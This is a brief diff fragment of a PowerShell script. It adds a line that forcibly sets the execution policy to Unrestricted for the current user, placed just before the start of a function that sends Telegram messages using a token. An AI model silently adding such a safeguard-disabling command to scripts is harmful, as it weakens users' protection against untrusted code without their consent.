@@ -1,4 +1,4 @@
-﻿
+﻿Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 function SendMessagetoTelegram{
 param(
 $token,
